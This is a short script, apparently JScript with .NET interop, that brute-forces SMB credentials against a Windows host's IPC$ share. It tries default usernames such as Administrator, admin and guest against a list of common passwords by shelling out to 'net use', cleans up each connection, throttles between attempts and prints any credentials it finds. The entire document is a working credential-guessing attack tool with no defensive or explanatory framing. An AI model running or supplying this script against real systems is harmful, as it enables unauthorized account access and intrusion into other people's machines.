(function() {
    var host = "127.0.0.1";
    var timeout = 5;
    var delayMs = 1000;

    var usernames = ["Administrator", "admin", "guest"];
    var passwords = [
        "",
        "P@ssw0rd",
        "password",
        "123456",
        "admin",
        "root",
        "123456789",
        "letmein"
    ];

    var Process = System.Diagnostics.Process;
    var ProcessStartInfo = System.Diagnostics.ProcessStartInfo;
    var Thread = System.Threading.Thread;

    var total = 0;
    var max = usernames.length * passwords.length;
    var result = "[+] SMB brute-force on \\\\" + host + "\\IPC$\n";
    result += "[+] Attempts: " + max + "\n\n";

    for (var i = 0; i < usernames.length; i++) {
        for (var j = 0; j < passwords.length; j++) {
            total++;
            var user = usernames[i];
            var pass = passwords[j];
            result += "[" + total + "] Trying: " + user + " / " + (pass === "" ? "(empty)" : pass) + " ... ";

            var safeUser = user.replace(/"/g, '""');
            var safePass = pass.replace(/"/g, '""');

            var cmd = "cmd.exe /c \"net use \\\\\\\\" + host + "\\\\IPC\\$ \"" + safePass + "\" /user:\"" + safeUser + "\" >nul 2>&1 && echo OK || echo FAIL\"";

            var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.CreateNoWindow = true;

            var p = Process.Start(psi);
            var output = p.StandardOutput.ReadToEnd().trim();
            p.WaitForExit();

            //
            var cleanup = new ProcessStartInfo("cmd.exe", "/c net use \\\\\\\\" + host + "\\\\IPC\\$ /delete >nul 2>&1");
            cleanup.UseShellExecute = false;
            cleanup.CreateNoWindow = true;
            Process.Start(cleanup).WaitForExit();

            if (output === "OK") {
                result += "SUCCESS!\n\n";
                result += "[+] CREDENTIALS FOUND:\n";
                result += "    Host: " + host + "\n";
                result += "    User: " + user + "\n";
                result += "    Pass: " + (pass === "" ? "(empty)" : pass) + "\n";
                return result;
            } else {
                result += "FAILED\n";
            }

            if (total < max) {
                Thread.Sleep(delayMs);
            }
        }
    }

    result += "\n[!] No valid SMB credentials found.\n";
    return result;
})()
